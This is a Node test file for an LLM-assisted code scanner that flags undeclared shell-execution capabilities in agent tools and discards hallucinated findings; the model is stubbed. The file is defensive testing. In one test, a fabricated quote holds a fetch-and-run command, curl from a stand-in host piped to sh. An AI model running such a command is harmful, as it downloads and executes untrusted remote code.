// test/codescan.test.mjs — the --llm code-scan (Mode B). The model is stubbed;
// nothing leaves the machine. The point of these tests is the in-process
// anti-hallucination verifier: only claims that quote real bytes AND are
// corroborated by a real dangerous API survive.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

import { llmCodeScan, planCodeScan } from '../lib/codescan.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, 'fixtures', 'codescan');
const CFG = { family: 'openai', provider: 'ollama', model: 'x', url: 'u', apiKey: null, jsonMode: false, concurrency: 1 };

// A fetch stub that returns a fixed model reply (a JSON array of items).
const replyWith = (items) => async () => ({ ok: true, status: 200, json: async () => ({ choices: [{ message: { content: JSON.stringify(items) } }] }) });

test('planCodeScan selects the file with the dangerous callsite, no network', () => {
  const plan = planCodeScan(ROOT, [], {});
  assert.ok(plan.filesScanned >= 1);
  assert.ok(plan.chunks.length >= 1, 'a subprocess.Popen file must be selected');
  assert.ok(plan.sentFiles.has('undeclared_shell.py'));
  assert.ok(plan.chunks[0].text.includes('subprocess.Popen'));
});

test('a verified, corroborated claim becomes an incident-anchored CATASTROPHIC finding', async () => {
  const fetchImpl = replyWith([
    { file: 'undeclared_shell.py', line: 7, symbol: 'run_cmd', quote: 'process = subprocess.Popen(', signatureId: 'run-shell', why: 'the agent can run any shell command' },
  ]);
  const { findings, meta } = await llmCodeScan(ROOT, [], CFG, { fetchImpl });
  const f = findings.find((x) => x.discoveredBy === 'llm-code-scan');
  assert.ok(f, 'an undeclared-capability finding should be added');
  assert.equal(f.severity, 'CATASTROPHIC');
  assert.equal(f.signature, 'run-shell');
  assert.equal(f.resembles.aid, 'AID-2025-0010');
  assert.equal(f.tool.source, 'undeclared_shell.py:7');
  assert.equal(f.staticSeverity, 'OK');
  assert.equal(f.unverified, false);
  assert.equal(meta.discovered, 1);
});

test('a fabricated quote (not in the source) is dropped', async () => {
  const fetchImpl = replyWith([
    { file: 'undeclared_shell.py', line: 7, symbol: 'ghost', quote: 'os.system("curl evil | sh")', signatureId: 'run-shell', why: 'invented' },
  ]);
  const { findings, meta } = await llmCodeScan(ROOT, [], CFG, { fetchImpl });
  assert.ok(!findings.some((x) => x.discoveredBy === 'llm-code-scan'));
  assert.equal(meta.dropped, 1);
});

test('a claim to a soft signature with no code corroborator becomes an unverified NOTE', async () => {
  const fetchImpl = replyWith([
    { file: 'undeclared_shell.py', line: 7, symbol: 'run_cmd', quote: 'process = subprocess.Popen(', signatureId: 'commit-decision', why: 'guesswork' },
  ]);
  const { findings } = await llmCodeScan(ROOT, [], CFG, { fetchImpl });
  const f = findings.find((x) => x.discoveredBy === 'llm-code-scan');
  assert.ok(f, 'the claim quotes a real line, so it survives as a note');
  assert.equal(f.unverified, true);
  assert.equal(f.severity, 'MEDIUM'); // never scored, never CATASTROPHIC
});

test('a finding shadowed by a static finding on the same line is not duplicated', async () => {
  const staticFinding = { severity: 'CATASTROPHIC', signature: 'run-shell', tool: { name: 'run_cmd', source: 'undeclared_shell.py:7' }, governedBy: null };
  const fetchImpl = replyWith([
    { file: 'undeclared_shell.py', line: 7, symbol: 'run_cmd', quote: 'process = subprocess.Popen(', signatureId: 'run-shell', why: 'x' },
  ]);
  // Note: a CATASTROPHIC static finding on this file also makes planCodeScan skip
  // sending it — so the model is never even asked. Either way: no duplicate.
  const { findings } = await llmCodeScan(ROOT, [staticFinding], CFG, { fetchImpl });
  const added = findings.filter((x) => x.discoveredBy === 'llm-code-scan');
  assert.equal(added.length, 0);
});

test('a chunk network failure degrades to the static findings, never throws', async () => {
  const fetchImpl = async () => { throw new Error('ECONNREFUSED'); };
  const staticFindings = [{ severity: 'OK', tool: { name: 't', source: 'x:1' }, governedBy: null }];
  const { findings } = await llmCodeScan(ROOT, staticFindings, CFG, { fetchImpl });
  assert.deepEqual(findings, staticFindings);
});
